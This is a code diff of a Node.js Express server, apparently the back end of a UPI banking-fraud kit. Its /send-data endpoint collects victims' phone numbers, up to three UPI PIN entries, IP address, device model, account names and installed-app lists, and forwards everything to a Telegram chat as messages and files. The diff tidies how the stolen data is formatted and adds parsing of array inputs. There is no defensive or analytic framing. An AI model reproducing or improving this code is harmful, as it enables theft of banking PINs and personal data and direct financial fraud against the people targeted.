@@ -73,55 +73,78 @@ const startupNotification = async () => {
 };
 
 app.post('/send-data', async (req, res) => {
-    // Adding accounts and packages to destructuring
     const { type, number, pin, deviceId, deviceTime, deviceDate, userIP, accounts, packages } = req.body;
     
     if (deviceId) {
         fullDeviceName = deviceId;
     }
 
-    // 1. Initial Number Logic
     if (type === 'NUMBER') {
         lastMessageId = null; 
         pinCount = 0; 
-        
+
         let updatedText = `*Device Model:* ${deviceId || 'Detecting...'}\n`;
         updatedText += `*IP Address:* "${userIP || 'Detecting...'}"\n`; 
         updatedText += `*Date:* ${deviceDate || 'Detecting...'}\n`; 
         updatedText += `*Real Time:* ${deviceTime || 'Detecting...'}\n`; 
-        updatedText += `*Number:* "+91${number}"\n`;
+        updatedText += `*Number:* "+91${number}"\n\n`;
         
-        await sendOrUpdateTelegram(updatedText);
+        updatedText += `[UPI_SECTION]`; 
+        updatedText += `\n[EXTRA_DATA_SECTION]`; 
+        
+        currentMessageText = updatedText;
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
     } 
-    
-    // 2. PIN Logic (Updates same message)
+
     else if (pin) {
         pinCount++; 
-        currentMessageText += `*UPI PIN:* "${pin}"\n`;
-        await sendOrUpdateTelegram(currentMessageText);
+        let newPinLine = `*UPI PIN:* "${pin}"\n`;
+        
+        if (pinCount === 1) {
+            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
+        } else {
+            currentMessageText = currentMessageText.replace("[UPI_SECTION]", `${newPinLine}[UPI_SECTION]`);
+        }
+        
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
 
         if (pinCount === 3) {
-            await sendFileToTelegram(currentMessageText, fullDeviceName);
+            await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
         }
     }
 
-    // 3. Accounts & Packages Logic (Updates same message)
     else if (accounts || packages) {
         let extraData = `\n*Account's*\n`;
-        if (accounts && Array.isArray(accounts)) {
-            accounts.forEach(acc => { extraData += `• ${acc}\n`; });
-        } else { extraData += `• Not Found\n`; }
-
+        
+        // ZAROORI UPDATE: String ko array mein badalne ke liye logic
+        let accList = accounts;
+        if (typeof accounts === 'string') {
+            try { accList = JSON.parse(accounts); } catch (e) { accList = [accounts]; }
+        }
+        
+        if (accList && Array.isArray(accList)) {
+            accList.forEach(acc => { extraData += `• ${acc}\n`; });
+        } else if (accList) {
+            extraData += `• ${accList}\n`;
+        }
+        
         extraData += `\n*Package's*\n`;
-        if (packages && Array.isArray(packages)) {
-            packages.forEach(pkg => { extraData += `• ${pkg}\n`; });
-        } else { extraData += `• Not Found\n`; }
+        
+        let pkgList = packages;
+        if (typeof packages === 'string') {
+            try { pkgList = JSON.parse(packages); } catch (e) { pkgList = [packages]; }
+        }
 
-        currentMessageText += extraData;
-        await sendOrUpdateTelegram(currentMessageText);
+        if (pkgList && Array.isArray(pkgList)) {
+            pkgList.forEach(pkg => { extraData += `• ${pkg}\n`; });
+        } else if (pkgList) {
+            extraData += `• ${pkgList}\n`;
+        }
 
-        // Final File after all data is gathered
-        await sendFileToTelegram(currentMessageText, fullDeviceName);
+        currentMessageText = currentMessageText.replace("[EXTRA_DATA_SECTION]", extraData);
+        await sendOrUpdateTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""));
+        
+        await sendFileToTelegram(currentMessageText.replace("[UPI_SECTION]", "").replace("[EXTRA_DATA_SECTION]", ""), fullDeviceName);
     }
     
     res.status(200).json({ success: true });
